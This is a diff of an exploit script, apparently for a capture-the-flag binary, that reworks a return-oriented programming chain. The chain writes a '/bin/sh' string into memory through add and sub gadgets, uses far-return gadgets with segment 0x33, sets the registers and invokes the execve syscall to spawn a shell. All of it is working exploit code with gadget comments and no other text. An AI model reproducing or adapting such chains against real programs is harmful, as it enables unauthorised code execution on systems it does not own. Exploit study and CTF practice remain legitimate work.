@@ -1,32 +1,22 @@
-payload = p64(0x441771)
-#0x0000000000441771: pop rbx; ret; 
-payload += p64(0x4a2187)+p64(0x4418ff)
+payload = p64(0x487275)
+#0x487275: pop rax ; cmp al, 3 ; retf
+payload += p64(0x91969dd1)+p32(0x4418ff)+p32(0x33)
 # 0x00000000004418ff: pop rdx; ret; 
-payload += p64(0x3b)+p64(0x4711bd)
-# 0x00000000004711bd: add dword ptr [rbx], edx; ret; 
-payload += p64(0x441771)
-# 0x0000000000441771: pop rbx; ret; 
-payload += p64(0x4a2070)+p64(0x4418ff)
+payload += p64(0x4a2070)+p64(0x45ff40)
+# 0x000000000045ff40: sub dword ptr [rdx], eax; ret; 
+payload += p64(0x487275)
+# 0x487275: pop rax ; cmp al, 3 ; retf
+payload += p64(0xff9799d1)+p32(0x4418ff)+p32(0x33)
 # 0x00000000004418ff: pop rdx; ret; 
-payload += p64(0x6e69622f)+p64(0x4711bd)
-# 0x00000000004711bd: add dword ptr [rbx], edx; ret; 
-payload += p64(0x441771)
-# 0x0000000000441771: pop rbx; ret; 
-payload += p64(0x4a2074)+p64(0x4418ff)
-# 0x00000000004418ff: pop rdx; ret; 
-payload += p64(0x68662f)+p64(0x4711bd)
-# 0x00000000004711bd: add dword ptr [rbx], edx; ret; 
-payload += p64(0x4017d3)
+payload += p64(0x4a2074)+p64(0x45ff40)
+# 0x000000000045ff40: sub dword ptr [rdx], eax; ret; 
+payload += p64(0x487275)
+# 0x487275: pop rax ; cmp al, 3 ; retf
+payload += p64(0x3b)+p32(0x4017d3)+p32(0x33)
 # 0x00000000004017d3: pop rdi; ret; 
 payload += p64(0x4a2070)+p64(0x439d35)
 # 0x0000000000439d35: pop rsi; ret; 
-payload += p64(0x0)+p64(0x40121f)
-# 0x000000000040121f: mov eax, 0; test rax, rax; je 0x1230; mov edi, 0x4a2080; jmp rax; 
-payload += p64(0x4418ff)
-# 0x00000000004418ff: pop rdx; ret; 
-payload += p64(0x4a2187)+p64(0x4136ca)
-# 0x00000000004136ca: add eax, dword ptr [rdx]; ret; 
-payload += p64(0x4418ff)
+payload += p64(0x0)+p64(0x4418ff)
 # 0x00000000004418ff: pop rdx; ret; 
 payload += p64(0x0)+p64(0x418bd3)
 # 0x0000000000418bd3: syscall; 
